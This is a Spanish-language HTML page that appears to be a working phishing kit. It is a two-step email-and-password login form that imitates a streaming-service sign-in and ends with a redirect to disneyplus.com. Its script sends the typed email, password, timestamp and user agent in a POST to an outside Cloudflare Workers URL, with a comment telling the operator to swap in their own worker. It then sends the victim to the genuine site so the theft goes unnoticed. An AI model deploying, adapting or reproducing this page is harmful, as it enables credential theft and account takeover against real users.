<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Mi proyecto</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            font-family: Arial, sans-serif;
            background: #061f27;
        }

        #intro {
            position: fixed;
            inset: 0;
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #061f27;
            transition: opacity .8s ease, visibility .8s ease;
        }

        #intro img {
            width: 159px;
            animation: pulse 1.4s ease-in-out infinite;
        }

        #intro.ocultar {
            opacity: 0;
            visibility: hidden;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.08); opacity: .75; }
        }

        #pagina {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .card {
            width: 100%;
            max-width: 580px;
            background: white;
            border-radius: 16px;
            padding: 40px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, .25);
        }

        .paso {
            display: none;
        }

        .paso.activo {
            display: block;
        }

        .numero-paso {
            font-size: 14px;
            color: #666;
            margin-bottom: 12px;
        }

        h1 {
            margin: 0 0 10px;
            font-size: 26px;
            color: #111;
        }

        .descripcion {
            color: #555;
            line-height: 1.5;
        }

        .campo {
            margin-top: 25px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: bold;
        }

        input {
            width: 100%;
            height: 52px;
            border: 1px solid #aaa;
            border-radius: 6px;
            padding: 0 15px;
            font-size: 16px;
            outline: none;
            transition: border-color .2s ease;
        }

        input:focus {
            border-color: #111;
        }

        .error-msg {
            color: #d32f2f;
            font-size: 13px;
            margin-top: 6px;
            display: none;
        }

        .error-msg.visible {
            display: block;
        }

        .input-error {
            border-color: #d32f2f !important;
        }

        .input-error:focus {
            border-color: #d32f2f !important;
        }

        button {
            width: 100%;
            height: 52px;
            margin-top: 25px;
            border: 0;
            border-radius: 28px;
            background: #111;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background .2s ease;
        }

        button:hover {
            background: #333;
        }

        .correo {
            margin-top: 20px;
            padding: 13px 15px;
            background: #f2f2f2;
            border-radius: 6px;
            color: #333;
        }

        .volver {
            margin-top: 15px;
            background: transparent;
            color: #111;
            border: 1px solid #aaa;
        }

        .volver:hover {
            background: #eee;
        }

        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin .8s ease-in-out infinite;
            vertical-align: middle;
            margin-right: 10px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .btn-loading {
            opacity: .7;
            pointer-events: none;
        }
    </style>
</head>

<body>

    <div id="intro">
        <img src="logo-C4Sr8ukq.webp" alt="Logo">
    </div>

    <main id="pagina">
        <div class="card">

            <!-- PASO 1 -->
            <section id="paso1" class="paso activo">
                <div class="numero-paso">Paso 1</div>
                <h1>Ingrese su dirección de correo electrónico</h1>

                <div class="campo">
                    <label for="email">Correo electrónico</label>
                    <input id="email" type="email" autocomplete="off" placeholder="Correo electrónico">
                    <div class="error-msg" id="emailError">
                        Ingresa un correo electrónico válido (incluye @ y un dominio).
                    </div>
                </div>

                <button id="continuar">Continuar</button>
            </section>

            <!-- PASO 2 -->
            <section id="paso2" class="paso">
                <div class="numero-paso">Paso 2</div>
                <h1>Ingrese su contraseña</h1>
                <p class="descripcion">Inicie sesión en su cuenta.</p>

                <div id="correoMostrado" class="correo"></div>

                <div class="campo">
                    <label for="password">Contraseña</label>
                    <input id="password" type="password" autocomplete="off" placeholder="Contraseña">
                </div>

                <button id="iniciarSesion">Iniciar sesión</button>
                <button id="volver" class="volver" type="button">Volver</button>
            </section>

        </div>
    </main>

    <script>
        // ============================================
        // CONFIGURACIÓN — CAMBIA ESTO POR TU WORKER
        // ============================================
        const WORKER_URL = 'https://white-rain-ae1d.michellmiranda0707.workers.dev';

        // ============================================
        // INTRO
        // ============================================
        window.addEventListener("load", () => {
            setTimeout(() => {
                document.getElementById("intro").classList.add("ocultar");
            }, 2500);
        });

        // ============================================
        // ELEMENTOS
        // ============================================
        const paso1 = document.getElementById("paso1");
        const paso2 = document.getElementById("paso2");
        const email = document.getElementById("email");
        const password = document.getElementById("password");
        const correoMostrado = document.getElementById("correoMostrado");
        const emailError = document.getElementById("emailError");
        const continuar = document.getElementById("continuar");
        const iniciarSesion = document.getElementById("iniciarSesion");
        const volver = document.getElementById("volver");

        // ============================================
        // VALIDACIÓN (SOLO AL HACER CLIC)
        // ============================================
        function esEmailValido(correo) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(correo);
        }

        function mostrarError() {
            email.classList.add("input-error");
            emailError.classList.add("visible");
        }

        function ocultarError() {
            email.classList.remove("input-error");
            emailError.classList.remove("visible");
        }

        email.addEventListener("input", () => {
            if (emailError.classList.contains("visible")) {
                const valor = email.value.trim();
                if (esEmailValido(valor)) {
                    ocultarError();
                }
            }
        });

        // ============================================
        // PASO 1 → PASO 2
        // ============================================
        continuar.addEventListener("click", () => {
            const correo = email.value.trim();
            if (!correo || !esEmailValido(correo)) {
                mostrarError();
                return;
            }
            ocultarError();
            correoMostrado.textContent = correo;
            paso1.classList.remove("activo");
            paso2.classList.add("activo");
        });

        // ============================================
        // VOLVER
        // ============================================
        volver.addEventListener("click", () => {
            paso2.classList.remove("activo");
            paso1.classList.add("activo");
        });

        // ============================================
        // INICIAR SESIÓN → ENVIAR A WORKER
        // ============================================
        iniciarSesion.addEventListener("click", () => {
            const pass = password.value.trim();
            const correo = correoMostrado.textContent;

            if (!pass) {
                alert("Ingrese una contraseña.");
                return;
            }

            // Mostrar loading en el botón
            iniciarSesion.innerHTML = '<span class="spinner"></span> Enviando...';
            iniciarSesion.classList.add("btn-loading");

            // Enviar al worker
            fetch(WORKER_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: correo,
                    password: pass,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent
                })
            })
            .then(() => {
                window.location.href = "https://www.disneyplus.com/";
            })
            .catch(() => {
                window.location.href = "https://www.disneyplus.com/";
            });
        });
    </script>

</body>
</html>
